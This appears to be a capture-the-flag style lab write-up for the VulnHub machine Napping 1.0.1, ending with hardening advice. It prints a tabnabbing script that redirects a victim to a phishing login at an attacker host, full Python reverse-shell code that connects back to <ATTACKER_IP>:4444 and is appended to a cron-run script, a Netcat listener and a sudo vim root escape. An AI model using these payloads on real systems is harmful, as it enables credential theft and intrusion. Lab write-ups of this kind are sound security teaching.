LAB COMPLETION REPORT: NAPPING 1.0.1
Security Assessment & Vulnerability Exploitation Writeup
1. Document Control & Executive Summary
This document serves as a formal security assessment and penetration testing writeup for the Napping 1.0.1 hacking laboratory environment. The purpose of this engagement was to identify security vulnerabilities within the target architecture, escalate privileges systematically, and achieve full administrative control (root access).
Metadata Parameter	Assessment Details
Target Machine	Napping: 1.0.1 (VulnHub Environment)
Objective	Gain a low-privileged shell and escalate privileges to root
Execution Path	Reverse Tabnabbing → Writable Script Injection → Vim Escape
Final Status	Success (Root Achieved)
2. Phase 1: Initial Access via Reverse Tabnabbing
Vulnerability Description
During the initial reconnaissance phase, a web application portal was identified running on the target machine. Reviewing the web portal's hyperlinks revealed that links to external sites or user-submitted links utilized the target="_blank" attribute but completely omitted the safety attribute rel="noopener" or rel="noreferrer".
This omission exposes the application to a Reverse Tabnabbing attack. When an internal user (such as the target user daniel) clicks the link, the newly opened malicious tab gains access to the parent window object via the window.opener property. The malicious site can then manipulate the parent page's location property, replacing the legitimate login screen with a replica phishing interface.
Exploitation Vectors & Execution
1. The attacker injected or submitted a custom external hyperlink pointing to an attacker-controlled web server containing the tabnabbing script.
2. The external page hosted a simple payload designed to modify the parent window's destination:
if (window.opener) {
    window.opener.location = "http://<ATTACKER_IP>/phishing_login.html";
}
When user daniel checked the links or viewed the page, his main browser window was silently redirected to the fake login page. Unaware of the tab hijack, the user re-entered his credentials, which were captured and logged by the attacker's server.
Captured Credentials
User Account: daniel
Access Level: Low-privileged Local User
3. Phase 2: Lateral Movement & Foothold Generation
Script Misconfiguration Analysis
Using the harvested credentials, a valid authenticated session or local access was established as user daniel. System enumeration was conducted to locate attack vectors for lateral movement or code execution.
During directory traversal and monitoring, a specific Python file named query.py was discovered. An inspection of file system permissions revealed a dangerous misconfiguration: the script was writable by the daniel user group or account, but it was being executed periodically by a higher-privileged process or another system daemon.
Reverse Shell Injection
Because daniel possessed write permissions over query.py, the script was modified to append a Python-based reverse shell payload. This allowed the attacker to hijack the execution flow next time the script was processed by the host system.
# Appended payload inside query.py
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<ATTACKER_IP>", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/sh", "-i"])
A Netcat listener was established on the attacker machine (nc -lvnp 4444). As soon as the system executed the modified query.py script, a connection was instantiated back to the listener, creating an interactive command-line shell session on the host machine.
4. Phase 3: Privilege Escalation via Vim Sudo Escape
Privilege Assessment
Upon establishing the reverse shell, standard privilege escalation discovery commands were issued. Running sudo -l or inspecting SUID/SGID binaries revealed that the current context had permissions to run the text editor Vim with administrative rights (either via passwordless sudo or an explicit SUID wrapper misconfiguration).
Exploitation Methodology
Vim features a built-in command execution system that allows users to drop to a shell or execute system utilities directly from within the editor interface via the ! prefix. When Vim is run under a sudo context, any commands executed through this mechanism inherit the security context of the spawning process (root).
The breakout was executed directly with a one-liner statement:
sudo vim -c ':!/bin/sh'
The -c flag tells Vim to run the specified command immediately upon launch. The editor executed :!/bin/sh as root, bypassing system restrictions and instantly opening an interactive root command prompt.
Root Confirmation
Command: id → uid=0(root) gid=0(root) groups=0(root)
Target Host Status: Fully Compromised
5. Remediation & Hardening Recommendations
To mitigate these vulnerabilities and prevent similar exploitation chains within production environments, the following defensive measures must be put into place immediately:
Vulnerability Category	Root Cause	Remediation Action
Web Security	Missing anchor attributes on hyperlinks utilizing target="_blank".	Always append rel="noopener noreferrer" to cross-origin external links to prevent window object manipulation.
Access Control	Insecure file permissions enabling standard users to write to operational scripts (query.py).	Enforce the Principle of Least Privilege. Restrict write access to administration files and scripts exclusively to the owner/root account.
System Hardening	Over-permissive Sudo configurations allowing text editors to be executed as root without restrictions.	Avoid granting full sudo privileges to binaries that possess shell-escape capabilities (e.g., Vim, Less, Nano, Tar). Use sudoedit for secure file modification.
